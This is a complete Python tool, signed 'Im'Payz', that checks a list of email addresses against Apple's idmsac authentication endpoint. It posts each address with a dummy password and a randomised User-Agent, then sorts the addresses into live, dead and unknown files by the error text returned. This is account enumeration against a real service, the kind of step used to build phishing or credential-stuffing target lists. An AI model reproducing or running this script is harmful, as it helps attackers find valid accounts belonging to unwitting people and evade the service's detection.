import requests
import os
from colorama import Fore, Back, Style
from random import randint

class Apple:

   

   def __init__(self):
      os.system('clear')
      print(Fore.GREEN,r"""
      
███████╗███████╗      █████╗ ██████╗ ██████╗ ██╗     ███████╗
██╔════╝╚══███╔╝     ██╔══██╗██╔══██╗██╔══██╗██║     ██╔════╝
█████╗    ███╔╝█████╗███████║██████╔╝██████╔╝██║     █████╗  
██╔══╝   ███╔╝ ╚════╝██╔══██║██╔═══╝ ██╔═══╝ ██║     ██╔══╝  
███████╗███████╗     ██║  ██║██║     ██║     ███████╗███████╗
╚══════╝╚══════╝     ╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚══════╝


                  """,Fore.YELLOW,"""| Coded By : Im'Payz |                                                            
""", Style.RESET_ALL)
      
      self.mailist = input("[#] Put Your List: ")
      self.jumlah = open(self.mailist)
      self.itung = self.jumlah.readlines()
      self.jumlahList = len(self.itung)
      print(Fore.YELLOW+"[-] Mail Loaded:",self.jumlahList,"Mailist",Style.RESET_ALL)
      print("\n")
      
      self.url = "https://idmsac.apple.com/authenticate"
     
      
            
      
   def randNumber(self,num):
      range_start = 10**(num-1)
      range_end = (10**num)-1
      return randint(range_start, range_end)
    
    
    
      
   def save_to_file(self,nameFile,x):
      kl = open(nameFile, 'a+')
      kl.write(x)
      kl.close()   
      
      
   def check(self):
   
   
       live = "Access denied. Your account does not have permission to access this application.".encode()
       die = "Your Apple ID or password was entered incorrectly".encode()
   
       email = open(self.mailist)
       
       
       for mail in email:              
       
          ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(self.randNumber(2))+"."+str(self.randNumber(1))+"."+str(self.randNumber(4))+"."+str(self.randNumber(3))+" Safari/537.36"
                     
          params = {
          'accountPassword':'xxxx',
          'appleId':mail,
          'appIdKey':'3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d'
          }
          r = requests.post(self.url, data=params, headers={'User-Agent':ua})
          
          
          mail.replace('\n\n',' ')
          if live in r.content:
             print ("[+]",mail.replace('\n',''),"=>",Fore.GREEN,"Live",Style.RESET_ALL)
             self.save_to_file('rezult/live.txt',mail+'\n')
          elif die in r.content: 
             print ("[+]",mail.replace('\n',''),"=>",Fore.RED,"Die",Style.RESET_ALL)
             self.save_to_file('rezult/die.txt',mail+'\n')
          else:
             print ("[+]",mail.replace('\n',''),"=>",Fore.RED,"Unknown",Style.RESET_ALL)
             self.save_to_file('rezult/unknown.txt',mail+'\n')
             
             
      

      
     
      
      
app = Apple()
app.check()
      
      
 